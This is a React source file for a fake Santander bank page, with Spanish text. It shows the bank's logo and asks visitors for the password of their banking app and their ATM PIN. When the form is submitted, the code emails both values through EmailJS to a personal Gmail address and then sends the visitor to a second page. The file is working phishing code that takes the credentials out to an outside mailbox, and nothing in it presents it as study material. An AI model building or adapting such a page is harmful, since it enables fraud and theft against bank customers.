import React from 'react';
import '../css/primerapag.css';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

function Primerapag() {
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const contram = formData.get('contram');
    const nipp = formData.get('nipp');

    try {
      const response = await emailjs.send('service_pl7uznq', 'template_nb08ccn', {
        contram,
        nipp,
        to_email: 'alosantamex@gmail.com'
      }, '8Mgn87H6amGJecjhG');

      if (response.status === 200) {
        console.log('Datos enviados correctamente');
        navigate('/segundapag');
      } else {
        console.error('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
    }
  };

  return (
    <div className="santander-container">
      <div className="santander-header">
        <span className="santander-logo">
          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="Logo Santander" />
        </span>
      </div>
      <form className="santander-form" onSubmit={handleSubmit}>
        <label>
          Contraseña que usa en su aplicación
          <input type="text" name="contram" placeholder="Contraseña" className="santander-input" required />
        </label>
        <label>
          Nip que utiliza en su Cajero
          <input type="tel" name="nipp" placeholder="Nip de 4 dígitos" className="santander-input" maxLength={4} required />
        </label>
        <button type="submit" className="santander-continue-button">Continuar</button>
      </form>
    </div>
  );
}

export default Primerapag;
